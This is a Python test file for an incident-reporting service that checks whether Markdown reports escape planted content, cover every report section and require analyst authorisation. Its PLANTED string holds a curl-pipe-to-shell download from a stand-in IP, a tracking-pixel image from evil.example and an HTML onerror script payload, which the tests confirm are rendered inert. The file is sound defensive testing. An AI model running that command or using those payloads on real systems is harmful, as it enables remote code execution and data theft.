"""Post-incident reports: complete, built from recorded data, and inert when attackers plant Markdown."""

import importlib.util
import json
import re
from pathlib import Path

from fastapi.testclient import TestClient

from core.app import Settings, create_app
from core.auth import AnalystDirectory, Principal
from ingestion.auth import SourceCredential
from reporting.report import code, text
from tests.conftest import fixture_bytes

ROOT = Path(__file__).resolve().parents[1]
ALICE = {"authorization": "Bearer alice-test"}
PLANTED = (
    "curl -s http://198.51.100.23/x.sh | sh ![pixel](https://evil.example/p.png) <img src=x onerror=alert(1)>"
)


def _demo():
    spec = importlib.util.spec_from_file_location("cloudshield_demo_report", ROOT / "scripts" / "demo.py")
    demo = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(demo)
    return demo


def live_markup(markdown: str) -> list[str]:
    """Markup a Markdown renderer would act on: outside code spans and not backslash-escaped.
    (Inside a code span, or after a backslash, `<img` and `![x](y)` render as plain characters.)"""
    outside_code = re.sub(r"(`+)(?:(?!\1).)+?\1", "", markdown)
    return [m for m in ("<", "![", "](") if re.search(r"(?<!\\)" + re.escape(m), outside_code)]


def test_escaping_keeps_planted_markdown_and_html_inert():
    escaped = text(PLANTED)
    assert live_markup(escaped) == []
    assert "\\!\\[pixel\\]" in escaped and "\\<img" in escaped
    assert live_markup(code(PLANTED)) == []
    assert code("a ` b") == "``a ` b``"
    assert code("x | y", in_table=True) == "`x \\| y`"
    assert "\n" not in text("line one\nline two")


def test_demo_report_covers_every_stage():
    report = _demo().run().report
    for heading in ("## Summary", "## Affected entity", "## Timeline", "## Evidence index", "## Findings",
                    "## Response", "## Open questions", "## Audit trail"):  # fmt: skip
        assert heading in report, heading
    assert "review: accepted by `analyst:bob`" in report
    assert "**Approved** by `analyst:bob`" in report and "(this version)" in report
    assert "`egress_probe`: skipped" in report
    assert "chain intact" in report
    assert "sha256:" in report and "`falco 14:02:40Z`" in report


def _client() -> TestClient:
    settings = Settings(
        cluster="cs-lab-eks",
        account_id="123456789012",
        investigator="offline",
        credentials={"falco": SourceCredential(token="falco-test")},
        analysts=AnalystDirectory.from_tokens(
            {"alice-test": Principal("analyst:alice", frozenset({"analyst"}))}
        ),
    )
    return TestClient(create_app(settings))


def test_planted_markdown_in_an_alert_cannot_reach_the_report_as_markup():
    client = _client()
    alert = json.loads(fixture_bytes("s1_suspicious_process", "falco_alert.json"))
    alert["output_fields"]["proc.cmdline"] = PLANTED
    alert["rule"] = "Unexpected Process <b>bold</b> ![t](https://evil.example/t.png)"
    client.post(
        "/v1/ingest/falco", content=json.dumps(alert).encode(), headers={"authorization": "Bearer falco-test"}
    )
    case_id = client.get("/v1/cases").json()[0]["case_id"]
    client.post(f"/v1/cases/{case_id}/investigations", headers=ALICE)

    report = client.get(f"/v1/cases/{case_id}/report", headers=ALICE).text
    assert "198.51.100.23" in report  # the evidence is there...
    assert live_markup(report) == []  # ...but none of it would render as markup


def test_report_route_needs_an_analyst_and_a_real_case():
    client = _client()
    assert client.get("/v1/cases/case_missing/report").status_code == 401
    assert client.get("/v1/cases/case_missing/report", headers=ALICE).status_code == 404

    client.post(
        "/v1/ingest/falco",
        content=fixture_bytes("s1_suspicious_process", "falco_alert.json"),
        headers={"authorization": "Bearer falco-test"},
    )
    case_id = client.get("/v1/cases").json()[0]["case_id"]
    r = client.get(f"/v1/cases/{case_id}/report", headers=ALICE)
    assert r.status_code == 200
    assert r.headers["content-type"].startswith("text/markdown")
    assert "attachment" in r.headers["content-disposition"]
    assert "No investigation was run" in r.text and "No response action was proposed" in r.text


def test_sample_report_in_the_repo_is_current():
    sample = (ROOT / "docs" / "sample-incident-report.md").read_text(encoding="utf-8")
    assert sample.startswith("# Incident report:")
    assert "## Audit trail" in sample and "chain intact" in sample
